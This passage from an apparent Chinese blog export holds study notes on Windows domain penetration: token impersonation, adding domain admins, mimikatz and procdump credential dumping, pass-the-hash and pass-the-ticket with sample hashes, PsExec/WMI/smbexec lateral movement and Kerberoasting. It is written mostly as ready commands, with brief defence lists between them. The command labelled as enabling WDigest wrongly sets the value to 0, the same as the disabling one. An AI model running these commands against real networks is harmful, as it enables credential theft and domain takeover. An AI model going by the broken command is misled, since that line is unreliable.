<li>Delegation Tokens  授权令牌，它支持交互式登录(例如通过远程桌面访问)</li>
<li>Impresonation Tokens 模拟令牌，它支持非交互式登录。</li>
</ul>
<p>令牌的数量取决于meterpreter Shell的访问级别。</p>
<p>使用<code>impersonate_token 令牌名</code>假冒对应的用户。用户名”&quot;需要使用\</p>
<p>使用命令后使用shell进入cmd输入whoami已经是administrator<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517114448.png"></p>
<h3 id="Rotten-Potato-本地提权"><a href="#Rotten-Potato-本地提权" class="headerlink" title="Rotten Potato 本地提权"></a>Rotten Potato 本地提权</h3><p>如果目标系统中存在有效令牌，可以通过Rotten Potato快速模拟用户令牌提权</p>
<p>将Rotenpotato.exe上传到目标机器。重新执行<code>impersonate_token</code>后可以获得System权限。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517115459.png"></p>
<h3 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h3><p>在meterprter 会话中使用ps命令查看系统进程。找到域管理进程，使用migrate命令迁移到该进程。并使用shell进入命令行使用命令添加域管理员</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user shutter xyz@ss /ad /domain   //添加域用户</span><br><span class="line">net group &quot;domain admins&quot; shutter /ad /domain //添加用户为域管理员</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /group  //查看域管理员</span><br></pre></td></tr></table></figure>

<p>同样在meterpreter中可以直接使用msf命令添加域管理员</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add_user shutter pwd -h 192.168.1.1</span><br><span class="line">add_group_user &quot;Domain Admins&quot; shutter -h 192.168.1.1</span><br></pre></td></tr></table></figure>

<h3 id="Empire令牌窃取"><a href="#Empire令牌窃取" class="headerlink" title="Empire令牌窃取"></a>Empire令牌窃取</h3><p>使用Empire获得服务器权限后。在<code>interact</code>页面使用<code>mimikatz</code>获得密码。<br>完成后使用<code>credentials</code>查看获得的密码。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517144511.png"></p>
<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul>
<li>安装微软推送补丁</li>
<li>对令牌的时效性进行控制</li>
<li>对于令牌采取加密存储方式</li>
<li>使用加密链路SSL/TLS传输令牌</li>
</ul>
<h2 id="无凭证权限获取"><a href="#无凭证权限获取" class="headerlink" title="无凭证权限获取"></a>无凭证权限获取</h2><h3 id="LLMNR和NetBIOS欺骗攻击"><a href="#LLMNR和NetBIOS欺骗攻击" class="headerlink" title="LLMNR和NetBIOS欺骗攻击"></a>LLMNR和NetBIOS欺骗攻击</h3><p>在服务器DNS失效时使用。</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>笔记</tag>
        <tag>Windows提权</tag>
      </tags>
  </entry>
  <entry>
    <title>内网安全攻防笔记5</title>
    <url>/2022/05/17/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B05/</url>
    <content><![CDATA[<h1 id="域横向"><a href="#域横向" class="headerlink" title="域横向"></a>域横向</h1><h2 id="Windows-散列值分析"><a href="#Windows-散列值分析" class="headerlink" title="Windows 散列值分析"></a>Windows 散列值分析</h2><h3 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h3><p>1.通过mimikatz直接读取SAM文件。需要考虑mimikatz的免杀<br>输入<code>privilege::debug</code>提权然后输入<code>token::elevate</code>提权至SYSTEM<br>输入<code>lsadump::sam</code>读取本地SAM文件</p>
<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517211901.png"></p>
<p>2.使用mimikatz在线读取SAM文件</p>
<p>输入一下命令<br><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code><br>读取散列以及明文密码<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517223808.png"></p>
<p>3.使用mimikatz离线读取lsass.dmp文件</p>
<p>(1)导出lsass.dmp文件</p>
<p>通过任务管理器找到lsass.exe进程导出lsass.dmp文件<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517212513.png"></p>
<p>(2) 使用Prodump导出lsass.dmp文件<br>Prodump为微软软件，不会报毒。</p>
<p>使用命令<br><code>prodump.exe -ma lsass.exe lsass.dmp</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517220745.png"></p>
<p>使用mimikatz导出lsass.dmp文件中的散列值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp  </span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517223737.png"></p>
<h3 id="单机密码的防范"><a href="#单机密码的防范" class="headerlink" title="单机密码的防范"></a>单机密码的防范</h3><p>微软发布补丁KB2871997防止通过内存在线读取密码，关闭了Wdigest功能。</p>
<p>Win 2012及以上级别默认关闭Wdigest功能无法读取明文密码。</p>
<p>在注册表中如果注册表项<code>Wdigest</code>为1，下次登录时可以使用工具获得明文密码为0则不能。</p>
<p>(1)  使用reg add 命令<br>开始Wdigest Auth 命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<p>关闭Wdigest Auth 命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<p>相当于在注册表添加<code>UseLogonCredential</code>参数<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517231414.png"></p>
<h3 id="使用Hashcat获取密码"><a href="#使用Hashcat获取密码" class="headerlink" title="使用Hashcat获取密码"></a>使用Hashcat获取密码</h3><p>Hashcat可以支持cpu破解密码</p>
<h3 id="防御攻击者抓取明文密码和散列值"><a href="#防御攻击者抓取明文密码和散列值" class="headerlink" title="防御攻击者抓取明文密码和散列值"></a>防御攻击者抓取明文密码和散列值</h3><ol>
<li>设置Protected User组</li>
</ol>
<p>在Win2012 R2中存在一个Protected User组。将用户添加到该组后，该用户的明文密码和散列值无法被mimikatz等工具抓取。</p>
<p>将Administrator添加到Protected User组后。mimikztz无法抓到明文密码或则散列值。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518110354.png"></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518110407.png"></p>
<ol start="2">
<li>安装KB2871997</li>
</ol>
<p>KB2871997是微软用来解决PsExec或IPC远程查看(c$)的补丁，可以本地帐号不允许被远程接入计算机系统。但是系统默认的本地管理员Administrator这个SID为500的帐号仍然可以登录计算机。安装KB2871997后，仍然需要禁用默认的Administrator帐号，用来防御Hash传递攻击。</p>
<ol start="3">
<li>通过修改注册表禁止在内存中存储明文密码</li>
</ol>
<p>通过修改注册表值WDigest，使得Windows不会将明文密码存储在内存中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>防御mimikatz攻击</li>
</ol>
<p>mimikatz抓取密码需要使用Debug权限，用于和lsass进程交互。可以将Debug权限从Administrator中取消，来防止mimikatz抓取密码。</p>
<h2 id="Hash传递攻击"><a href="#Hash传递攻击" class="headerlink" title="Hash传递攻击"></a>Hash传递攻击</h2><p>PTH攻击通过抓到帐号的Hash值，通过Hash值来登录内网中的其他计算机。在内网中大量计算机会采取相同的本地管理员的帐号密码。如果取得一台计算机的管理员帐号Hash，通过传递Hash可以绕过Hash破解，直接通过工具转递Hash，来在其他计算机上登录。</p>
<h3 id="使用NTLM-Hash传递"><a href="#使用NTLM-Hash传递" class="headerlink" title="使用NTLM Hash传递"></a>使用NTLM Hash传递</h3><p>在目标机器中以管理员运行mimikatz</p>
<p>输入一下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:HACKE /ntlm:afffeba176210fad4628f0524bfe1942</span><br></pre></td></tr></table></figure>
<p>然后弹出cmd窗口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518152254.png"></p>
<p>在cmd窗口中尝试弹出DC的C盘内容<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518152442.png"></p>
<h3 id="使用AES-256转递"><a href="#使用AES-256转递" class="headerlink" title="使用AES-256转递"></a>使用AES-256转递</h3><p>使用mimikatz抓取AES-256</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>

<p>以管理员权限运行mimikatz命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:WIN2008-TEST /domain:HACKE /aes256:79c793443b72eea70419c4cc44a3f01c2463c8db14a60615aaed060cb272e804</span><br></pre></td></tr></table></figure>

<p>需要安装KB2871997才可以通过导入AES-256的方式进行横向移动。</p>
<p>需要注意的点:</p>
<ul>
<li>dir 后跟主机名，不是ip地址。否则提示用户名或者密码错误</li>
<li>除了AES-256，AES-128也可以用于PTH</li>
<li>使用AES密钥传递前提是安装KB2871997</li>
<li>如果安装KB2871997，仍然对应SID为500的管理员进行NTLM Hash传送</li>
<li>如果需要使用mimikatz的Hash传送，需要使用管理员运行</li>
</ul>
<h3 id="更新KB2871977影响"><a href="#更新KB2871977影响" class="headerlink" title="更新KB2871977影响"></a>更新KB2871977影响</h3><p>KB2871977禁止本地管理员权限与远程计算机进行连接。无法通过本地管理员权限对远程计算机使用PsExec, WMI, smbexec , schtasks, 。也无法访问远程主机的共享文件</p>
<p>但是使用SID=500的管理员帐号，仍然可以通过NTLM Hash进行传送。</p>
<h2 id="票据传递-PTT"><a href="#票据传递-PTT" class="headerlink" title="票据传递(PTT)"></a>票据传递(PTT)</h2><p>如果使用mimikatz进行PTH需要获得本地管理员权限。mimikatz提供了不需要本地管理员权限就可以进行横向渗透的方法:票据传递(Pass The Ticket,PTT)</p>
<h3 id="使用mimikatz进行PTT"><a href="#使用mimikatz进行PTT" class="headerlink" title="使用mimikatz进行PTT"></a>使用mimikatz进行PTT</h3><p>使用mimikatz，将内存中的票据导出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
<p>在当前目录会出现许多票据，如krbtgt,cifs,ldap等<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518154812.png"></p>
<p>使用mimikatz清除内存中的票据<br><code>kerberos::purge</code></p>
<p>将票据文件注入内存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt &quot;[0;46f2e]-2-1-40e10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi&quot;</span><br></pre></td></tr></table></figure>

<h3 id="使用kekeo进行票据传递"><a href="#使用kekeo进行票据传递" class="headerlink" title="使用kekeo进行票据传递"></a>使用kekeo进行票据传递</h3><p>kekeo使用域名，用户名，NTLM Hash生成票据，再将票据导入。</p>
<p>输入命令生成票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:administrator /domain:HACKE.TESTLAB /ntlm:afffeba176210fad4628f0524bfe1942</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518161635.png"></p>
<p>在kekeo中清除票据文件<br><code>kerberos::purge</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518161811.png"></p>
<p>也可以使用Windows 自带命令清除票据<br><code>klist purge</code></p>
<p>使用命令将票据导内存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGT_administrator@HACKE.TESTLAB_krbtgt~HACKE.TESTLAB@HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518162015.png"></p>
<h2 id="PsExec使用"><a href="#PsExec使用" class="headerlink" title="PsExec使用"></a>PsExec使用</h2><p>PsExec是Windows提供的工具，可以通过命令行与目标机器进行连接，甚至不需要通过RDP进行图形化控制。</p>
<h3 id="PsTools工具包中的PsExec"><a href="#PsTools工具包中的PsExec" class="headerlink" title="PsTools工具包中的PsExec"></a>PsTools工具包中的PsExec</h3><p>PsExec的基本原理:通过管道在远程机器上建立一个psexec服务，并在本地磁盘中生成一个PSEXESVC的二进制文件。通过psexec服务执行命令,运行后删除服务。</p>
<p>首先需要获得系统的Shell。在建立了IPC$后使用命令获得System权限的Shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe -accepteula \\192.168.1.2 -s cmd.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>-accepeula第一次使用弹出确认框，使用后默认确认。</li>
<li>-s:用System权限运行，如果不使用获得Administrator权限</li>
</ul>
<p>如果没有建立IPC$连接可以指定帐号密码连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec \\192.168.1.2 -u HACKE\administrator -p password cmd.exe</span><br></pre></td></tr></table></figure>

<p>使用PsExec需要注意</p>
<ul>
<li>需要远程开启admin$共享(默认开启)</li>
<li>使用ipc$连接后，不需要输入密码</li>
<li>使用PsExec执行远程命令，会在目标系统中产生一个psexec服务。命令执行后,psexec服务自动删除。创建或者删除服务时产生大量日志，可以通过日志反推攻击流程</li>
<li>PsExec可以获得System权限</li>
</ul>
<h3 id="MSF中的Psexec模块"><a href="#MSF中的Psexec模块" class="headerlink" title="MSF中的Psexec模块"></a>MSF中的Psexec模块</h3><p>msf中search psexec有许多模块。<br>常用的有</p>
<ul>
<li>/windows/smb/psexec</li>
<li>/windows/smb/psexec_psh(PowerShell版本)</li>
</ul>
<p>使用Psexec_psh版本。该版本使用PowerShell实现Payload。免杀效果优于默认版本。但是在win7, win2008及以上版本才有PowerShell。所以低版本还是需要使用默认版本</p>
<h2 id="WMI的使用"><a href="#WMI的使用" class="headerlink" title="WMI的使用"></a>WMI的使用</h2><p>在PsExec在内网被加入黑名单后，逐渐使用WMI来进行横向移动。通过MMI横向移动，系统不会产生日志。</p>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:192.168.1.2 /user:administrator /password:password process call create &quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span><br></pre></td></tr></table></figure>

<p>使用目标系统cmd执行ipconfig 将结果保存在 <code>C:\Windows\System32\ip.txt</code>中</p>
<p>后续使用ipc$读取执行结果<br><code>type \\192.168.1.2\c$\Windows\System32\ip.txt</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520125454.png"><br>如果Wmic执行恶意程序，将不会留下日志。</p>
<h3 id="ipmacket工具包中的wmiexec"><a href="#ipmacket工具包中的wmiexec" class="headerlink" title="ipmacket工具包中的wmiexec"></a>ipmacket工具包中的wmiexec</h3><p>可以用于Linux 向 Windows渗透时使用</p>
<h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>通过VBS调用WMI模拟PSExec功能。可以获得一个半交互式Shell</p>
<h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1脚本包含在PowerSploit工具包中。本质上是通过PowerShell调用WMI</p>
<h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>利用PowerShell自带的Invoke_WMIMethod可以在远程系统中执行命令和指定程序</p>
<h2 id="smbexec使用"><a href="#smbexec使用" class="headerlink" title="smbexec使用"></a>smbexec使用</h2><p>smbexec可以通过文件共享(admin$, c$, ipc$ ,d$)在远程系统中执行命令</p>
<h3 id="C-版smbexec"><a href="#C-版smbexec" class="headerlink" title="C++版smbexec"></a>C++版smbexec</h3><h3 id="impacket中的smbexec-py"><a href="#impacket中的smbexec-py" class="headerlink" title="impacket中的smbexec.py"></a>impacket中的smbexec.py</h3><p>使用命令连接<br><code>smbexec.py administrator:password@192.168.1.2</code></p>
<p>连接后为System权限<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520132335.png"></p>
<h3 id="Linux跨Windows远程命令执行工具"><a href="#Linux跨Windows远程命令执行工具" class="headerlink" title="Linux跨Windows远程命令执行工具"></a>Linux跨Windows远程命令执行工具</h3><p>链接:<a href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p>
<p>下载后运行install.sh进行安装</p>
<p>默认安装在/opt目录下</p>
<p>运行<code>smbexec</code>出现错误</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520133908.png"></p>
<p>在smbexec目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install ruby-dev</span><br><span class="line">bundler install</span><br></pre></td></tr></table></figure>
<p><code>bundler install</code>出现错误<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520134222.png"><br><code>gem install nokogiri -v &#39;1.5.5&#39; </code></p>
<p>这里又出现错误<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520135824.png"><br>…….<br>以后再说先跳过这个</p>
<h2 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h2><p>先跳过</p>
<h2 id="SPN在域环境下的运用"><a href="#SPN在域环境下的运用" class="headerlink" title="SPN在域环境下的运用"></a>SPN在域环境下的运用</h2><h3 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h3><p>在使用Kerberos协议进行身份验证的网络中，如果需要运行服务则必须要为使用的帐号手动注册SPN。</p>
<p>Kerberos通过SPN将服务实例与服务登录帐号关联。如果计算机安装了多个服务实例，那么每一个服务实例都需要一个SPN。</p>
<p>例如:如果用户需要访问MSSQL服务，系统以当前用户身份向CD查询SPN为”MSSQL”的记录。找到SPN后，用户将TGT 和 需要访问的SPN发送给KDC。KDC对TGT解密后，由TGS将一张允许访问SPN对应服务的票据和SPN对应的服务器地址给用户。用户使用票据访问对应服务。</p>
<p>SPN命令的格式如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</span><br></pre></td></tr></table></figure>
<ul>
<li>service: 服务组件的名称</li>
<li>hostname: 以”/“与后面的名称分隔,是计算机的FQDN(全限定域名，同时带有计算机名和域名)</li>
<li>port: 以冒号分隔，后面为端口号</li>
<li>serivcename: 可以是服务的专有名称(DN), objectGuid, Internet 主机名或全限定域名</li>
</ul>
<p>常见SPN服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSSQLSvc/computer1.pentest.com:1433</span><br></pre></td></tr></table></figure>
<ul>
<li>MSSQLSvc: 服务组件名，此处为MSSQL服务</li>
<li>computer1.pentest.com: 主机名为computer1 域名为 pentest.com</li>
<li>1433 : 端口为1433</li>
</ul>
<p>serviceclass和hostname是必选参数， port和service是可选参数</p>
<p>Exchange服务的实例代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exchangeMDB/EXCAS01.pentest.com</span><br></pre></td></tr></table></figure>
<p>RDP服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TERMSERV/EXCAS01.pentest.com</span><br></pre></td></tr></table></figure>
<p>WSMan/WINRM/PSRemoting服务代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WSMAN/EXCAS01.pentest.com</span><br></pre></td></tr></table></figure>

<p>通过SPN进行服务扫描的PowerShell脚本</p>
<p>当计算机加入域时，主SPN会自动添加到域的计算机帐号ServicePrincipaName属性中。在安装新的服务后，SPN也会被记录在计算机帐号的相关属性中。</p>
<p>SPN扫描通过请求特点的SPN类型的服务主题名称来查询服务。与网络端口扫描相比SPN扫描不需要通过网络中的每一个IP地址端口来检查服务，因此不会触发内网中的IPS,IDS的设置规则产生大量的警告日志。同时SPN查询是Kerberos票据的一部分，检测难度较大。</p>
<p>PowerShell-AD-Recon工具包提供了一系列服务与服务登录帐号和运行徐福的主机之间的对应关系，服务包括但是不限于MSSQL, EXchange, RDP , WinRM.</p>
<p>(1) 利用SPN发现域中所有MSSQL服务</p>
<p>SPN通过LDAP协议向DC查询，只需要获得一个普通的域用户权限，可以进行SPN扫描。<br>以域用户运行一个PowerShell进程，将脚本导入并执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Discover-PSMSSQLServers.ps1</span><br><span class="line">Discover-PSMSSQLServers</span><br></pre></td></tr></table></figure>

<p>(2)扫描域中所有SPN信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Discover-PSInterestingServices.ps1</span><br><span class="line">Discover-PSInterestingServices</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520144454.png"></p>
<p>(3) Windows自带工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -T domain -q */*</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520144607.png"></p>
<h3 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h3><p>Kerberoast是对于Kerberos协议的攻击方法。在需要使用某个资源向TGS发送Kerberos票据时。用户首先需要使用具有有效身份权限的TGT向TGS请求相应服务的票据。当TGT验证具有该服务权限时，会向用户发送一张票据。该票据使用与SPN相关的计算机服务的帐号的NTML Hash(RC4_HMAC_MD5).也就是说攻击者通过Kerberoast尝试使用不同的NTLM Hash打开Kerberos票据。如果攻击者使用的NTLM Hash正确，票据会被打开，该NTLM Hash则是对应于该计算机服务张行的密码。</p>
<p>在域环境中，通过使用Kerberoast使用普通用户的权限在AD中，将计算机服务帐号凭据提取。使用该方法大部分操作离线完成，不会引起报警。通过大多数网络安全策略不够严格(计算机服务密码过期时间未设置， 计算机服务权限过高， 计算机服务帐号和普通用户帐号相同)</p>
<p>下面通过使用分析Kerberoast攻击流程</p>
<h3 id="Kerberoast实验"><a href="#Kerberoast实验" class="headerlink" title="Kerberoast实验"></a>Kerberoast实验</h3><p>(1) 手动注册SPN</p>
<p>使用命令，手动注册MSSQL服务SPN<br><code>setspn -A MSSQLSvc/WIN2008-TEST.hacke.testlab:1433 mssql</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520145659.png"><br>(2) 查看用户对应SPN<br>查看所有SPN<br><code>setspn -T domain -q */*</code><br>查看指定用户SPN<br><code>setspn -L hacke.testlab\win2008-test</code></p>
<p>(3) 使用 adsiedit.msc 查看用户SPN 和其他高级属性</p>
<p>(4) 配置指定服务的登录权限</p>
<p>执行命令，在AD中为用户配置登录服务的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gpedit.msc\Computer COnfiguration\Windows Settings\Security Settins\Local Policies\User Rights Assignment\Log on as a service </span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520150449.png"></p>
<p>(5)修改加密类型<br>Kerberos协议的加密类型默认为<code>AES256_HMAC</code>，通过tgsrepcrack.py无法破解该加密方式，所以攻击者会通过服务器组策略将加密方式设置为<code>RC4_HMAC_MD5</code> 命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gpedit.msc\Computer COnfiguration\Windows Settings\Security Settins\Local Policies\Security Options\Network security: Configure encryption types allowed for Kerberos </span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520150840.png"></p>
<p>(6) 请求SPN Kerberos票据</p>
<p>在 PowerShell中输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/WIN2008-TEST.hacke.testlab&quot;</span><br></pre></td></tr></table></figure>
<p>生成票据</p>
<p>(7)导出票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::list /export </span><br></pre></td></tr></table></figure>
<p>导出票据在当前目录的kirbi文件夹中，加密方式为<code>RC4_HMAC_MD5</code><br>(8)使用 Kerberoast脚本离线破解票据对应帐号的NTLM Hash</p>
<p>在Kerberoast 中有一个tgsrepcrack.py脚本，可以离线破解NTLM Hash。使用如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python tgsrepcrack.py wordlist.txt mssql.kirbi</span><br></pre></td></tr></table></figure>

<h3 id="防范建议"><a href="#防范建议" class="headerlink" title="防范建议"></a>防范建议</h3><ul>
<li>确保密码安全性</li>
<li>无法修改默认加密方式从 AES 到 RC4</li>
<li>强制使用AES256加密Kerberos票据</li>
<li>服务帐号适当配置</li>
<li>日志审计关注ID为4769(请求Kerberos票据)事件。如果有过多4769行为，应该进一步确认系统是否安全</li>
</ul>
<h2 id="Exchange邮件安全"><a href="#Exchange邮件安全" class="headerlink" title="Exchange邮件安全"></a>Exchange邮件安全</h2><p>跳过</p>
]]></content>
      <tags>
        <tag>内网</tag>
        <tag>笔记</tag>
        <tag>域横向</tag>
      </tags>
  </entry>
</search>
